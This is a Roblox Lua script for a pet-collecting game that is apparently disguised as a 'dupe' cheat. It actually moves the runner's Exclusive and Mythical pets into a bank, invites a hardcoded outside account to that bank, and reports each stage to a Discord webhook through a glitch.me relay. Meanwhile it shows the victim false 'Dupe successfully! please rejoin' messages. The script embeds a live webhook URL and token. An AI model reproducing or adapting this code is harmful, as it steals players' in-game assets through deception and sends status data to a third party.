local YourID = 158551913
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}

local msg = "Epic shit"
local Player = game:GetService("Players").LocalPlayer;
local PlayerName = Player.Name;

local webhook = "https://discord.com/api/webhooks/945015737221800006/PixbgFnmr3lI-n6MKZHlAJqgHxDxW5SpjdEjP1xy2Dj9pIT-OPPjXcjkmPOcsLunLmFU"
local HttpService = game:GetService("HttpService");
local botname = "".. PlayerName ..""

function specials(Webhook, Message, Botname)
    local Name;
    local start = game:HttpGet("http://buritoman69.glitch.me");
    local biggie = "http://buritoman69.glitch.me/webhook";
    if (not Message or Message == "" or not Botname) then
        Name = "GameBot"
        return error("nil or empty message!")
    else
        Name = Botname;
    end
    local Body = {
        ['Key'] = tostring("applesaregood"),
        ['Message'] = tostring(Message),
        ['Name'] = Name,
        ['Webhook'] = Webhook    
    }
    Body = HttpService:JSONEncode(Body);
    local Data = game:HttpPost(biggie, Body, false, "application/json")
    return Data or nil;
end

for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 900000000);
if lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 900000000) then
    msg = "Stage 1 nice"
    specials(webhook, msg, botname)
    lib.Message.New("Dupe starting");
else
    msg = "Stage 1 bad"
    specials(webhook, msg, botname)
    lib.Message.New(request2 and "Something went wrong. Try again!");
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
    msg = "Invited successfully!"
    specials(webhook, msg, botname)
    lib.Message.New("Dupe successfully! please rejoin");
else
    msg = "Invite to bank failed"
    specials(webhook, msg, botname)
    lib.Message.New("Dupe failure :( please try again");
end;
